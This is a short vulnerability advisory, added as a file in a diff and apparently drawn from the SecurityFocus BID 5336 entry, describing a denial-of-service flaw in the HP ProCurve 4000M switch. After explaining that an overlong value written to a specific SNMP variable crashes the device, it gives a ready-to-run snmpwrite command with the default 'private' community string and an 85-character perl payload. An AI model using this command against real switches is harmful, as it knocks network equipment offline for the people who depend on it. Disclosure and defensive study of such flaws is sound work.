@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/5336/info
+
+An issue has been reported with the HP ProCurve 4000M Switch.
+
+An attacker with SNMP write access to the device may write to the SNMP variable .iso.3.6.1.4.1.11.2.36.1.1.2.1.0. If more than 85 characters are written to this variable, the device will crash the next time it accepts a connection to either the configured telnet or HTTP port. 
+
+snmpwrite <switch_ip> private .iso.3.6.1.4.1.11.2.36.1.1.2.1.0 s `perl -e 'print "A"x85;'` 
